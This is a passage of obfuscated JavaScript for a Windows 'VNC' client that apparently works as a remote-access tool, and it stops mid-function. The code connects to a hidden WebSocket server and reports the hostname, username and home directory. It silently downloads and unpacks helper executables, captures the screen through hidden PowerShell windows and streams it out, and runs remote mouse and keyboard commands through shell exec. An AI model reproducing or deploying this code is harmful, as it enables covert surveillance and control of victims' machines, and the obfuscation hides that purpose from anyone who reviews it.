const _0x16c21b=_0x36ad;(function(_0x301d66,_0x48480f){const _0x1616c8=_0x36ad,_0x246402=_0x301d66();while(!![]){try{const _0x46a63f=-parseInt(_0x1616c8(0x1f5))/0x1*(parseInt(_0x1616c8(0x1b7))/0x2)+-parseInt(_0x1616c8(0x259))/0x3*(-parseInt(_0x1616c8(0x257))/0x4)+parseInt(_0x1616c8(0x202))/0x5+parseInt(_0x1616c8(0x299))/0x6*(parseInt(_0x1616c8(0x1d0))/0x7)+-parseInt(_0x1616c8(0x1e4))/0x8*(parseInt(_0x1616c8(0x2a3))/0x9)+-parseInt(_0x1616c8(0x284))/0xa+parseInt(_0x1616c8(0x29b))/0xb;if(_0x46a63f===_0x48480f)break;else _0x246402['push'](_0x246402['shift']());}catch(_0x15e9d9){_0x246402['push'](_0x246402['shift']());}}}(_0x5dad,0xbb0df));const WebSocket=require('ws'),os=require('os'),crypto=require(_0x16c21b(0x1f0)),fs=require('fs'),{exec}=require(_0x16c21b(0x254)),path=require(_0x16c21b(0x212)),https=require(_0x16c21b(0x29f));class SimpleWindowsVNC{constructor(){const _0x25b30f=_0x16c21b;this['ws']=null,this['serverUrl']=process[_0x25b30f(0x28f)][_0x25b30f(0x20b)]||_0x25b30f(0x287),this[_0x25b30f(0x294)]=this[_0x25b30f(0x228)](),this['isStreaming']=![],this[_0x25b30f(0x255)]=null,this[_0x25b30f(0x232)]=0xa,this['quality']=0x50,this[_0x25b30f(0x264)]=0.8,this['screenWidth']=0x780,this[_0x25b30f(0x27d)]=0x438,this[_0x25b30f(0x280)]=0x0,this[_0x25b30f(0x1df)]=os[_0x25b30f(0x220)](),this[_0x25b30f(0x1ad)]=![],this[_0x25b30f(0x1e2)]=null,this[_0x25b30f(0x1e8)]=![],this[_0x25b30f(0x1ae)]=null,this[_0x25b30f(0x26a)]=![],this['reconnectAttempts']=0x0,this[_0x25b30f(0x1e3)]=0xa,this[_0x25b30f(0x1fe)]=0xbb8,this[_0x25b30f(0x234)]=null,this[_0x25b30f(0x245)]();}[_0x16c21b(0x228)](){const _0x160c29=_0x16c21b,_0x491a13=os[_0x160c29(0x214)](),_0x4f06ff=Object[_0x160c29(0x26e)](_0x491a13)[_0x160c29(0x1c5)]()[_0x160c29(0x217)](_0x13d46e=>!_0x13d46e['internal']&&_0x13d46e[_0x160c29(0x207)]!=='00:00:00:00:00:00'),_0x3f2685=_0x4f06ff?_0x4f06ff[_0x160c29(0x207)]:'unknown';return crypto['createHash'](_0x160c29(0x2a0))[_0x160c29(0x261)](os[_0x160c29(0x1dd)]()+'-'+_0x3f2685+'-'+Date[_0x160c29(0x24a)]())[_0x160c29(0x1da)](_0x160c29(0x1b9))[_0x160c29(0x24c)](0x0,0x10);}async[_0x16c21b(0x245)](){const _0x282a9b=_0x16c21b;try{console[_0x282a9b(0x231)](_0x282a9b(0x210)),await this[_0x282a9b(0x249)](),await this[_0x282a9b(0x271)](),await this['connectToServer']();}catch(_0x4a039f){console[_0x282a9b(0x250)]('Initialization\x20failed:',_0x4a039f['message']),this[_0x282a9b(0x283)]();}}async[_0x16c21b(0x249)](){const _0x33963a=_0x16c21b;try{require(_0x33963a(0x275)),this[_0x33963a(0x26a)]=!![],console['log'](_0x33963a(0x1d9));}catch(_0x471f1c){this[_0x33963a(0x26a)]=![],console[_0x33963a(0x231)](_0x33963a(0x262));}await this[_0x33963a(0x1aa)](),await this[_0x33963a(0x29a)]();}async[_0x16c21b(0x1aa)](){const _0x12a157=_0x16c21b;try{this[_0x12a157(0x1e2)]=path['join'](__dirname,_0x12a157(0x27f));if(fs[_0x12a157(0x200)](this[_0x12a157(0x1e2)])){this['hasNirCmd']=!![],console['log'](_0x12a157(0x227));return;}console[_0x12a157(0x231)](_0x12a157(0x1de));const _0x3c304f=_0x12a157(0x278);await new Promise((_0x217115,_0x21350c)=>{const _0x2a6467=_0x12a157;https[_0x2a6467(0x25d)](_0x3c304f,_0xa042eb=>{const _0x14211c=_0x2a6467;if(_0xa042eb['statusCode']===0xc8){const _0x101baa=[];_0xa042eb['on'](_0x14211c(0x291),_0xfbc5e3=>_0x101baa[_0x14211c(0x1be)](_0xfbc5e3)),_0xa042eb['on'](_0x14211c(0x208),async()=>{const _0x170814=_0x14211c;try{const _0x909554=Buffer[_0x170814(0x1e0)](_0x101baa),_0xa05abe=path['join'](__dirname,_0x170814(0x1ea));fs[_0x170814(0x252)](_0xa05abe,_0x909554),await this[_0x170814(0x1c3)]('powershell\x20-Command\x20\x22Expand-Archive\x20-Path\x20\x27'+_0xa05abe+'\x27\x20-DestinationPath\x20\x27'+__dirname+_0x170814(0x297));const _0x31badb=[path[_0x170814(0x22a)](__dirname,'nircmd.exe'),path[_0x170814(0x22a)](__dirname,_0x170814(0x1b3),_0x170814(0x27f)),path[_0x170814(0x22a)](__dirname,_0x170814(0x247))];for(const _0x1fad72 of _0x31badb){if(fs[_0x170814(0x200)](_0x1fad72)){_0x1fad72!==this[_0x170814(0x1e2)]&&fs['copyFileSync'](_0x1fad72,this[_0x170814(0x1e2)]);this[_0x170814(0x1ad)]=!![],console[_0x170814(0x231)](_0x170814(0x277));break;}}try{fs['unlinkSync'](_0xa05abe);const _0x1eb89a=path[_0x170814(0x22a)](__dirname,'nircmd');fs[_0x170814(0x200)](_0x1eb89a)&&fs['rmSync'](_0x1eb89a,{'recursive':!![],'force':!![]});}catch(_0xd67992){}_0x217115();}catch(_0x13f787){_0x21350c(_0x13f787);}});}else _0x21350c(new Error(_0x14211c(0x298)+_0xa042eb[_0x14211c(0x1c4)]));})['on'](_0x2a6467(0x250),_0x21350c);});}catch(_0x44cd66){console['error'](_0x12a157(0x21d),_0x44cd66[_0x12a157(0x28d)]),this[_0x12a157(0x1ad)]=![];}}async[_0x16c21b(0x29a)](){const _0x63bb2c=_0x16c21b;try{this['sendkeysPath']=path[_0x63bb2c(0x22a)](__dirname,'sendkeys.exe');if(fs[_0x63bb2c(0x200)](this[_0x63bb2c(0x1ae)])){this[_0x63bb2c(0x1e8)]=!![],console['log'](_0x63bb2c(0x1f2));return;}console['log'](_0x63bb2c(0x26f));const _0x1b7f4f=_0x63bb2c(0x266);await new Promise((_0x59f0d1,_0x5e2d4c)=>{https['get'](_0x1b7f4f,_0x4c511f=>{const _0x5dc449=_0x36ad;if(_0x4c511f['statusCode']===0x12e||_0x4c511f[_0x5dc449(0x1c4)]===0x12d)https[_0x5dc449(0x25d)](_0x4c511f['headers'][_0x5dc449(0x1b6)],_0x19ccf3=>{this['downloadSendKeys'](_0x19ccf3,_0x59f0d1,_0x5e2d4c);})['on'](_0x5dc449(0x250),_0x5e2d4c);else _0x4c511f[_0x5dc449(0x1c4)]===0xc8?this[_0x5dc449(0x1bd)](_0x4c511f,_0x59f0d1,_0x5e2d4c):_0x5e2d4c(new Error(_0x5dc449(0x298)+_0x4c511f[_0x5dc449(0x1c4)]));})['on']('error',_0x5e2d4c);});}catch(_0x413959){console['error'](_0x63bb2c(0x1d3),_0x413959[_0x63bb2c(0x28d)]),this[_0x63bb2c(0x1e8)]=![];}}['downloadSendKeys'](_0x3d477e,_0x47f799,_0x4bd4a2){const _0x11fc31=_0x16c21b;try{const _0x5da4cb=fs['createWriteStream'](this[_0x11fc31(0x1ae)]);_0x3d477e['pipe'](_0x5da4cb),_0x5da4cb['on'](_0x11fc31(0x1af),()=>{const _0x529e63=_0x11fc31;_0x5da4cb['close'](),this[_0x529e63(0x1e8)]=!![],console[_0x529e63(0x231)](_0x529e63(0x1d7)),_0x47f799();}),_0x5da4cb['on'](_0x11fc31(0x250),_0x29da58=>{const _0x1156d9=_0x11fc31;fs[_0x1156d9(0x1bc)](this[_0x1156d9(0x1ae)],()=>{}),_0x4bd4a2(_0x29da58);});}catch(_0x4b506e){_0x4bd4a2(_0x4b506e);}}async['getScreenResolution'](){const _0x4e7807=_0x16c21b;try{const _0x5e1ad5=_0x4e7807(0x288),_0x3977df=await this['execCommand'](_0x5e1ad5),_0x396c61=_0x3977df[_0x4e7807(0x290)](/(\d+)x(\d+)/);_0x396c61&&(this[_0x4e7807(0x27b)]=parseInt(_0x396c61[0x1]),this[_0x4e7807(0x27d)]=parseInt(_0x396c61[0x2]),console[_0x4e7807(0x231)]('Screen\x20resolution:\x20'+this[_0x4e7807(0x27b)]+'x'+this[_0x4e7807(0x27d)]));}catch(_0x7fc33e){console[_0x4e7807(0x250)](_0x4e7807(0x258),_0x7fc33e[_0x4e7807(0x28d)]);}}async[_0x16c21b(0x1ce)](){const _0x303fb4=_0x16c21b;try{console[_0x303fb4(0x231)](_0x303fb4(0x1b0)+this[_0x303fb4(0x281)]),this['ws']=new WebSocket(this[_0x303fb4(0x281)],{'perMessageDeflate':![],'handshakeTimeout':0x2710,'pingInterval':0x7530,'pongTimeout':0x1388}),this['ws']['on']('open',()=>{const _0x4e9024=_0x303fb4;console[_0x4e9024(0x231)](_0x4e9024(0x282)),this['reconnectAttempts']=0x0,this[_0x4e9024(0x1f4)](),this[_0x4e9024(0x211)]();}),this['ws']['on'](_0x303fb4(0x28d),_0x4f358e=>{this['handleServerMessage'](_0x4f358e);}),this['ws']['on'](_0x303fb4(0x1d5),(_0x565732,_0x3d1a78)=>{const _0x5bab4e=_0x303fb4;console[_0x5bab4e(0x231)]('Connection\x20closed:\x20'+_0x565732+_0x5bab4e(0x292)+_0x3d1a78),this[_0x5bab4e(0x203)](),this[_0x5bab4e(0x283)]();}),this['ws']['on'](_0x303fb4(0x250),_0x4de50d=>{const _0xb6e1c8=_0x303fb4;console[_0xb6e1c8(0x250)](_0xb6e1c8(0x243),_0x4de50d['message']),this[_0xb6e1c8(0x203)](),this[_0xb6e1c8(0x283)]();});}catch(_0x5b11a0){console['error'](_0x303fb4(0x209),_0x5b11a0[_0x303fb4(0x28d)]),this[_0x303fb4(0x283)]();}}['startPingPong'](){const _0x2501f8=_0x16c21b;this[_0x2501f8(0x234)]=setInterval(()=>{const _0x3bed5e=_0x2501f8;this['ws']&&this['ws'][_0x3bed5e(0x1c2)]===WebSocket['OPEN']&&this[_0x3bed5e(0x1d6)]({'type':'ping','timestamp':Date[_0x3bed5e(0x24a)]()});},0x61a8);}[_0x16c21b(0x203)](){const _0x25e550=_0x16c21b;this[_0x25e550(0x1b1)](),this['pingInterval']&&(clearInterval(this['pingInterval']),this[_0x25e550(0x234)]=null);}['registerClient'](){const _0x53bf17=_0x16c21b,_0x55fa99={'type':_0x53bf17(0x24b),'clientId':this[_0x53bf17(0x294)],'platform':'win32','screenWidth':this[_0x53bf17(0x27b)],'screenHeight':this[_0x53bf17(0x27d)],'hostname':os[_0x53bf17(0x1dd)](),'timestamp':Date[_0x53bf17(0x24a)](),'userInfo':{'username':os[_0x53bf17(0x1fc)]()[_0x53bf17(0x1cb)],'homedir':os[_0x53bf17(0x1fc)]()[_0x53bf17(0x273)]},'capabilities':{'screenshot':!![],'mouse':this[_0x53bf17(0x1ad)],'keyboard':this[_0x53bf17(0x1e8)],'mouseMethod':this[_0x53bf17(0x1ad)]?_0x53bf17(0x1b3):_0x53bf17(0x256),'keyboardMethod':this[_0x53bf17(0x1e8)]?'sendkeys':_0x53bf17(0x256)}};this[_0x53bf17(0x1d6)](_0x55fa99),console[_0x53bf17(0x231)]('Client\x20registered\x20with\x20server');}[_0x16c21b(0x1d1)](_0x197cc6){const _0x4cb4b4=_0x16c21b;try{const _0x5bb51e=JSON[_0x4cb4b4(0x218)](_0x197cc6[_0x4cb4b4(0x23c)]());switch(_0x5bb51e[_0x4cb4b4(0x1ed)]){case'registered':console[_0x4cb4b4(0x231)](_0x4cb4b4(0x1f9));break;case _0x4cb4b4(0x260):console['log'](_0x4cb4b4(0x1c7)),this['startStreaming'](_0x5bb51e[_0x4cb4b4(0x1e5)]||{});break;case _0x4cb4b4(0x21b):console[_0x4cb4b4(0x231)]('Stopping\x20screen\x20stream'),this[_0x4cb4b4(0x1b1)]();break;case'mouse_event':this['handleMouseEvent'](_0x5bb51e[_0x4cb4b4(0x291)]);break;case _0x4cb4b4(0x22f):this['handleKeyboardEvent'](_0x5bb51e['data']);break;case _0x4cb4b4(0x24f):this[_0x4cb4b4(0x1ef)](_0x5bb51e['config']);break;case'ping':this[_0x4cb4b4(0x1d6)]({'type':_0x4cb4b4(0x272),'timestamp':_0x5bb51e['timestamp']||Date['now']()});break;}}catch(_0xce7c73){console[_0x4cb4b4(0x250)](_0x4cb4b4(0x21f),_0xce7c73[_0x4cb4b4(0x28d)]);}}['startStreaming'](_0x5f3632={}){const _0x494c27=_0x16c21b;this['isStreaming']&&this['stopStreaming'](),this[_0x494c27(0x241)]=_0x5f3632['quality']||this[_0x494c27(0x241)],this['fps']=_0x5f3632[_0x494c27(0x232)]||this[_0x494c27(0x232)],this['compressionRatio']=_0x5f3632[_0x494c27(0x25f)]||this[_0x494c27(0x264)],this[_0x494c27(0x20e)]=!![],this['frameCount']=0x0,console[_0x494c27(0x231)]('Starting\x20stream:\x20'+this[_0x494c27(0x232)]+_0x494c27(0x27c)+this[_0x494c27(0x241)]+_0x494c27(0x27e)+this[_0x494c27(0x264)]),this[_0x494c27(0x23e)](),this[_0x494c27(0x255)]=setInterval(()=>{const _0x20a404=_0x494c27;this[_0x20a404(0x23e)]();},0x3e8/this[_0x494c27(0x232)]),this[_0x494c27(0x1d6)]({'type':_0x494c27(0x1b8),'clientId':this[_0x494c27(0x294)],'config':{'fps':this[_0x494c27(0x232)],'quality':this[_0x494c27(0x241)],'compression':this[_0x494c27(0x264)]}});}['stopStreaming'](){const _0x5b9c2c=_0x16c21b;this[_0x5b9c2c(0x255)]&&(clearInterval(this[_0x5b9c2c(0x255)]),this['streamInterval']=null),this[_0x5b9c2c(0x20e)]&&(this[_0x5b9c2c(0x20e)]=![],console[_0x5b9c2c(0x231)](_0x5b9c2c(0x235)),this['ws']&&this['ws']['readyState']===WebSocket[_0x5b9c2c(0x233)]&&this['sendToServer']({'type':'stream_stopped','clientId':this['clientId']}));}async[_0x16c21b(0x23e)](){const _0x2467aa=_0x16c21b;try{const _0x2d6fb8=await this['captureScreen']();if(_0x2d6fb8){const _0x22b6a9=Math[_0x2467aa(0x22d)](this[_0x2467aa(0x27b)]*this[_0x2467aa(0x264)]),_0x137424=Math[_0x2467aa(0x22d)](this[_0x2467aa(0x27d)]*this[_0x2467aa(0x264)]),_0x1e22c8={'type':'screen_frame','clientId':this[_0x2467aa(0x294)],'timestamp':Date[_0x2467aa(0x24a)](),'width':_0x22b6a9,'height':_0x137424,'originalWidth':this['screenWidth'],'originalHeight':this['screenHeight'],'compressionRatio':this['compressionRatio'],'data':_0x2d6fb8,'frameNumber':this['frameCount']};this['sendToServer'](_0x1e22c8),this['frameCount']++;}}catch(_0x3c4268){console[_0x2467aa(0x250)](_0x2467aa(0x1ab),_0x3c4268[_0x2467aa(0x28d)]);}}async[_0x16c21b(0x25b)](){const _0x1c4347=_0x16c21b;try{const _0xd185f7=path[_0x1c4347(0x22a)](this[_0x1c4347(0x1df)],_0x1c4347(0x1ff)+Date['now']()+_0x1c4347(0x23f)),_0x5d8a58=_0x1c4347(0x28b)+_0x1c4347(0x29c)+_0x1c4347(0x222)+_0x1c4347(0x1f7)+'$bitmap\x20=\x20New-Object\x20System.Drawing.Bitmap\x20$screen.Width,$screen.Height;\x20'+_0x1c4347(0x265)+_0x1c4347(0x201)+('$bitmap.Save(\x27'+_0xd185f7+_0x1c4347(0x223))+_0x1c4347(0x1bb)+_0x1c4347(0x1bf);await this['execCommand'](_0x5d8a58);if(fs[_0x1c4347(0x200)](_0xd185f7)){const _0x3a4a52=fs[_0x1c4347(0x1ee)](_0xd185f7);try{fs[_0x1c4347(0x2a2)](_0xd185f7);}catch(_0x3f55e5){}if(this['hasSharp']){const _0x15cba5=require(_0x1c4347(0x275)),_0x47b2af=Math['floor'](this[_0x1c4347(0x27b)]*this[_0x1c4347(0x264)]),_0x3af740=Math[_0x1c4347(0x22d)](this[_0x1c4347(0x27d)]*this[_0x1c4347(0x264)]),_0x3596ed=await _0x15cba5(_0x3a4a52)[_0x1c4347(0x1d2)](_0x47b2af,_0x3af740,{'kernel':_0x15cba5['kernel'][_0x1c4347(0x274)]})[_0x1c4347(0x1f1)]({'quality':this[_0x1c4347(0x241)],'progressive':!![]})[_0x1c4347(0x293)]();return _0x3596ed[_0x1c4347(0x23c)](_0x1c4347(0x20f));}else return _0x3a4a52['toString']('base64');}else throw new Error(_0x1c4347(0x237));}catch(_0x26f0db){return console[_0x1c4347(0x250)]('Screen\x20capture\x20error:',_0x26f0db[_0x1c4347(0x28d)]),null;}}['handleMouseEvent'](_0x57d5bc){const _0x1f8e0f=_0x16c21b;this[_0x1f8e0f(0x1ad)]?this[_0x1f8e0f(0x295)](_0x57d5bc):this[_0x1f8e0f(0x1ac)](_0x57d5bc);}async['handleNirCmdMouse'](_0x3eee3a){const _0x45f1d5=_0x16c21b;try{const {x:_0x69c172,y:_0x54a500,button:_0x28487c,action:_0x3d6e13,deltaY:_0x2904e3}=_0x3eee3a;if(_0x69c172===undefined||_0x54a500===undefined)return;const _0x31c0ba=Math['floor'](_0x69c172/this[_0x45f1d5(0x264)]),_0x5c04f4=Math['floor'](_0x54a500/this[_0x45f1d5(0x264)]),_0x55fa42=Math[_0x45f1d5(0x263)](0x0,Math[_0x45f1d5(0x20d)](_0x31c0ba,this[_0x45f1d5(0x27b)]-0x1)),_0x2afac6=Math[_0x45f1d5(0x263)](0x0,Math[_0x45f1d5(0x20d)](_0x5c04f4,this['screenHeight']-0x1)),_0x8bfa91='\x22'+this[_0x45f1d5(0x1e2)]+'\x22';switch(_0x3d6e13){case'move':await this['execCommand'](_0x8bfa91+_0x45f1d5(0x25c)+_0x55fa42+'\x20'+_0x2afac6);break;case _0x45f1d5(0x28c):let _0x41ee80;switch(_0x28487c){case _0x45f1d5(0x1cf):_0x41ee80=_0x8bfa91+_0x45f1d5(0x246)+_0x55fa42+'\x20'+_0x2afac6;break;case'middle':_0x41ee80=_0x8bfa91+_0x45f1d5(0x296)+_0x55fa42+'\x20'+_0x2afac6;break;default:_0x41ee80=_0x8bfa91+'\x20sendmouse\x20left\x20click\x20'+_0x55fa42+'\x20'+_0x2afac6;}await this['execCommand'](_0x41ee80);break;case'scroll':await this[_0x45f1d5(0x1c3)](_0x8bfa91+_0x45f1d5(0x25c)+_0x55fa42+'\x20'+_0x2afac6);const _0x583ded=_0x2904e3>0x0?'up':_0x45f1d5(0x1d4),_0x1b63f3=Math[_0x45f1d5(0x20d)](Math[_0x45f1d5(0x1cd)](_0x2904e3)||0x3,0x5);for(let _0x223ae0=0x0;_0x223ae0<_0x1b63f3;_0x223ae0++){await this[_0x45f1d5(0x1c3)](_0x8bfa91+'\x20sendmouse\x20wheel\x20'+_0x583ded);}break;case _0x45f1d5(0x279):let _0x3ad967;switch(_0x28487c){case _0x45f1d5(0x1cf):_0x3ad967=_0x8bfa91+_0x45f1d5(0x248)+_0x55fa42+'\x20'+_0x2afac6;break;case _0x45f1d5(0x267):_0x3ad967=_0x8bfa91+_0x45f1d5(0x26b)+_0x55fa42+'\x20'+_0x2afac6;break;default:_0x3ad967=_0x8bfa91+'\x20sendmouse\x20left\x20dblclick\x20'+_0x55fa42+'\x20'+_0x2afac6;}await this['execCommand'](_0x3ad967);break;}}catch(_0x131f8e){console['error'](_0x45f1d5(0x22c),_0x131f8e[_0x45f1d5(0x28d)]);}}async[_0x16c21b(0x1ac)](_0x17fcf7){const _0x48ea5e=_0x16c21b;try{const {x:_0xf3df94,y:_0x220c3c,action:_0x289b9f}=_0x17fcf7;if(_0xf3df94===undefined||_0x220c3c===undefined)return;const _0xe00aa9=Math[_0x48ea5e(0x22d)](_0xf3df94/this['compressionRatio']),_0x350fb7=Math[_0x48ea5e(0x22d)](_0x220c3c/this[_0x48ea5e(0x264)]);switch(_0x289b9f){case _0x48ea5e(0x286):await this['execCommand'](_0x48ea5e(0x253)+_0xe00aa9+',\x20'+_0x350fb7+')\x22');break;case _0x48ea5e(0x28c):const _0x53c4b3=_0x48ea5e(0x24d)+_0x48ea5e(0x29c)+('[System.Windows.Forms.Cursor]::Position\x20=\x20New-Object\x20System.Drawing.Point('+_0xe00aa9+',\x20'+_0x350fb7+_0x48ea5e(0x205))+_0x48ea5e(0x1c8)+'Add-Type\x20-TypeDefinition\x20\x27using\x20System;\x20using\x20System.Runtime.InteropServices;\x20'+'public\x20class\x20Win32\x20{\x20[DllImport(\x5c\x22user32.dll\x5c\x22)]\x20public\x20static\x20extern\x20void\x20mouse_event(uint\x20dwFlags,\x20uint\x20dx,\x20uint\x20dy,\x20uint\x20dwData,\x20UIntPtr\x20dwExtraInfo);\x20}\x27;\x20'+_0x48ea5e(0x22e);await this[_0x48ea5e(0x1c3)](_0x53c4b3);break;}}catch(_0x1c6e1a){console[_0x48ea5e(0x250)](_0x48ea5e(0x29e),_0x1c6e1a[_0x48ea5e(0x28d)]);}}[_0x16c21b(0x2a4)](_0x1b90a8){const _0x14ad86=_0x16c21b;this[_0x14ad86(0x1e8)]?this[_0x14ad86(0x1b5)](_0x1b90a8):this[_0x14ad86(0x242)](_0x1b90a8);}async[_0x16c21b(0x1b5)](_0x9fc222){const _0x1aff2b=_0x16c21b;try{const {key:_0x178fd8,action:_0x1a4812,modifiers:_0x17f82b,text:_0x9f1541}=_0x9fc222,_0x1b6166='\x22'+this['sendkeysPath']+'\x22';if(_0x9f1541&&_0x9f1541[_0x1aff2b(0x230)]>0x0){const _0x215dff=_0x9f1541[_0x1aff2b(0x1d8)](/"/g,'\x5c\x22');await this[_0x1aff2b(0x1c3)](_0x1b6166+'\x20\x22'+_0x215dff+'\x22');return;}if(_0x178fd8&&_0x178fd8[_0x1aff2b(0x230)]===0x1&&(_0x1a4812==='press'||!_0x1a4812)){await this[_0x1aff2b(0x1c3)](_0x1b6166+'\x20\x22'+_0x178fd8+'\x22');return;}if(_0x17f82b&&_0x17f82b[_0x1aff2b(0x230)]>0x0&&_0x178fd8){const _0x4a4108=_0x17f82b[_0x1aff2b(0x1e7)](_0x4e6e30=>{const _0x202e08=_0x1aff2b,_0x5db5d0={'ctrl':_0x202e08(0x1ca),'control':_0x202e08(0x1ca),'alt':_0x202e08(0x1b2),'shift':_0x202e08(0x21e)};return _0x5db5d0[_0x4e6e30['toLowerCase']()]||_0x4e6e30[_0x202e08(0x238)]();})['join']('+'),_0xf93fe0=this[_0x1aff2b(0x1ba)](_0x178fd8);if(_0xf93fe0){const _0x49e41b=_0x4a4108+'+'+_0xf93fe0;await this['execCommand'](_0x1b6166+'\x20\x22{'+_0x49e41b+'}\x22');}return;}if(_0x178fd8){const _0x300b00=this['mapSendKeysKey'](_0x178fd8);_0x300b00?await this[_0x1aff2b(0x1c3)](_0x1b6166+_0x1aff2b(0x225)+_0x300b00+'}\x22'):await this[_0x1aff2b(0x1c3)](_0x1b6166+'\x20\x22'+_0x178fd8+'\x22');}}catch(_0x27cb1b){console[_0x1aff2b(0x250)](_0x1aff2b(0x1c9),_0x27cb1b[_0x1aff2b(0x28d)]),await this['handlePowerShellKeyboard'](_0x9fc222);}}[_0x16c21b(0x1ba)](_0x2ea74d){const _0x33d329=_0x16c21b,_0x265682={'Enter':_0x33d329(0x269),'Escape':_0x33d329(0x23a),'Backspace':'BACKSPACE','Delete':'DELETE','Tab':_0x33d329(0x1e6),'Space':_0x33d329(0x1fd),'ArrowUp':'UP','ArrowDown':_0x33d329(0x22b),'ArrowLeft':_0x33d329(0x1e9),'ArrowRight':'RIGHT','Home':_0x33d329(0x26c),'End':_0x33d329(0x27a),'PageUp':'PGUP','PageDown':_0x33d329(0x21c),'Insert':'INSERT','F1':'F1','F2':'F2','F3':'F3','F4':'F4','F5':'F5','F6':'F6','F7':'F7','F8':'F8','F9':'F9','F10':'F10','F11':_0x33d329(0x1dc),'F12':_0x33d329(0x23b)};return _0x265682[_0x2ea74d]||null;}async['handlePowerShellKeyboard'](_0x3ded98){const _0x1aeceb=_0x16c21b;try{const {key:_0x5b34e6,action:_0x2e330f,modifiers:_0x5ef33b,text:_0x57f92d}=_0x3ded98;if(_0x57f92d&&_0x57f92d[_0x1aeceb(0x230)]>0x0){const _0xfd6383=_0x57f92d[_0x1aeceb(0x1d8)](/'/g,'\x27\x27')[_0x1aeceb(0x1d8)](/"/g,'\x22\x22'),_0x496c9c='powershell\x20-WindowStyle\x20Hidden\x20-Command\x20\x22Add-Type\x20-AssemblyName\x20System.Windows.Forms;\x20[System.Windows.Forms.SendKeys]::SendWait(\x27'+_0xfd6383+_0x1aeceb(0x2a1);await this[_0x1aeceb(0x1c3)](_0x496c9c);return;}if(_0x5ef33b&&_0x5ef33b['length']>0x0&&_0x5b34e6&&_0x2e330f==='press'){const _0x152f55=_0x5ef33b[_0x1aeceb(0x1e7)](_0x215183=>{const _0x4d7160={'ctrl':'^','control':'^','alt':'%','shift':'+'};return _0x4d7160[_0x215183['toLowerCase']()]||'';})[_0x1aeceb(0x22a)](''),_0x42d99a=this[_0x1aeceb(0x276)](_0x5b34e6);if(_0x42d99a){const _0x7fbec2=''+_0x152f55+_0x42d99a,_0x560204=_0x1aeceb(0x29d)+_0x7fbec2+_0x1aeceb(0x2a1);await this['execCommand'](_0x560204);}return;}if(_0x5b34e6&&_0x2e330f===_0x1aeceb(0x226)){const _0xfc385e=this[_0x1aeceb(0x276)](_0x5b34e6);if(_0xfc385e){const _0x14b212='powershell\x20-WindowStyle\x20Hidden\x20-Command\x20\x22Add-Type\x20-AssemblyName\x20System.Windows.Forms;\x20[System.Windows.Forms.SendKeys]::SendWait(\x27'+_0xfc385e+'\x27)\x22';await this[_0x1aeceb(0x1c3)](_0x14b212);}else{if(_0x5b34e6[_0x1aeceb(0x230)]===0x1){const _0x109ad2='powershell\x20-WindowStyle\x20Hidden\x20-Command\x20\x22Add-Type\x20-AssemblyName\x20System.Windows.Forms;\x20[System.Windows.Forms.SendKeys]::SendWait(\x27'+_0x5b34e6+'\x27)\x22';await this[_0x1aeceb(0x1c3)](_0x109ad2);}}}}catch(_0x59eba5){console['error'](_0x1aeceb(0x1cc),_0x59eba5['message']);}}[_0x16c21b(0x276)](_0x2d7911){const _0x6a929b=_0x16c21b,_0x4c7264={'Enter':'{ENTER}','Escape':'{ESC}','Backspace':_0x6a929b(0x1f3),'Delete':_0x6a929b(0x285),'Tab':'{TAB}','Space':'\x20','ArrowUp':_0x6a929b(0x1e1),'ArrowDown':_0x6a929b(0x204),'ArrowLeft':_0x6a929b(0x1c6),'ArrowRight':_0x6a929b(0x251),'Home':_0x6a929b(0x1c0),'End':_0x6a929b(0x26d),'PageUp':'{PGUP}','PageDown':_0x6a929b(0x20c),'Insert':_0x6a929b(0x20a),'F1':_0x6a929b(0x215),'F2':_0x6a929b(0x1fa),'F3':_0x6a929b(0x1f6),'F4':_0x6a929b(0x224),'F5':_0x6a929b(0x25a),'F6':_0x6a929b(0x23d),'F7':_0x6a929b(0x270),'F8':_0x6a929b(0x240),'F9':_0x6a929b(0x216),'F10':_0x6a929b(0x289),'F11':_0x6a929b(0x28e),'F12':_0x6a929b(0x236)};return _0x4c7264[_0x2d7911]||null;}[_0x16c21b(0x1ef)](_0x16451f){const _0x3c9e1c=_0x16c21b;console[_0x3c9e1c(0x231)](_0x3c9e1c(0x239),_0x16451f);if(_0x16451f[_0x3c9e1c(0x241)])this[_0x3c9e1c(0x241)]=_0x16451f[_0x3c9e1c(0x241)];if(_0x16451f[_0x3c9e1c(0x232)])this[_0x3c9e1c(0x232)]=_0x16451f['fps'];if(_0x16451f[_0x3c9e1c(0x25f)])this[_0x3c9e1c(0x264)]=_0x16451f[_0x3c9e1c(0x25f)];this[_0x3c9e1c(0x20e)]&&(this[_0x3c9e1c(0x1b1)](),setTimeout(()=>this['startStreaming'](),0x3e8));}['sendToServer'](_0x4a9fb2){const _0x5d4d01=_0x16c21b;if(this['ws']&&this['ws']['readyState']===WebSocket[_0x5d4d01(0x233)])try{this['ws'][_0x5d4d01(0x25e)](JSON[_0x5d4d01(0x206)](_0x4a9fb2));}catch(_0x21d8ad){console[_0x5d4d01(0x250)](_0x5d4d01(0x268),_0x21d8ad['message']);}}async[_0x16c21b(0x1c3)](_0x463c1e){return new Promise((_0xcde3c6,_0x5750a0)=>{exec(_0x463c1e,{'timeout':0x2710},(_0x2ce147,_0xb27ce1,_0x4fcb5c)=>{const _0x344e3c=_0x36ad;_0x2ce147?_0x5750a0(new Error(_0x344e3c(0x219)+_0x2ce147['message'])):_0xcde3c6(_0xb27ce1['trim']());});});}[_0x16c21b(0x283)](){const _0x514180=_0x16c21b;this[_0x514180(0x1fb)]>=this[_0x514180(0x1e3)]&&(console[_0x514180(0x250)](_0x514180(0x24e)),process['exit'](0x1));this[_0x514180(0x1fb)]++;const _0x2ef14b=this[_0x514180(0x1fe)]*Math[_0x514180(0x28a)](1.2,this[_0x514180(0x1fb)]-0x1);console[_0x514180(0x231)]('Reconnecting\x20in\x20'+Math[_0x514180(0x1db)](_0x2ef14b/0x3e8)+'s\x20(attempt\x20'+this[_0x514180(0x1fb)]+'/'+this['maxReconnectAttempts']+')'),setTimeout(()=>{this['connectToServer']();},_0x2ef14b);}['gracefulShutdown'](){const _0x3cbf47=_0x16c21b;console['log'](_0x3cbf47(0x1f8)),this['cleanup'](),this['ws']&&this['ws'][_0x3cbf47(0x1d5)](0x3e8,'Client\x20shutdown'),process['exit'](0x0);}}process['on'](_0x16c21b(0x244),()=>{const _0x1d23be=_0x16c21b;console[_0x1d23be(0x231)](_0x1d23be(0x1eb)),global['simpleVncClient']?global['simpleVncClient']['gracefulShutdown']():process['exit'](0x0);}),process['on'](_0x16c21b(0x1c1),()=>{const 